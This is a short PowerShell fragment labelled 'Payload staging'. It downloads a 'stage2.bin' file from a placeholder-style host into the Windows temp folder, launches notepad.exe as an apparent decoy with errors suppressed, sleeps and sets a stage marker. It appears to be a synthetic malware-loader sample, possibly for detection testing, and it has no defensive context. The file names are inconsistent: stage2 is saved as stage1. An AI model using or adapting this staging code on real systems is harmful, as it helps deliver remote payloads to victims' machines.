
<# Payload staging #> (New-Object System.Net.WebClient).DownloadFile('https://contoso.com/stage2.bin', "$env:TEMP\stage1.bin"); Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; Start-Sleep -Seconds 28; $StageMarker = "stage-8"
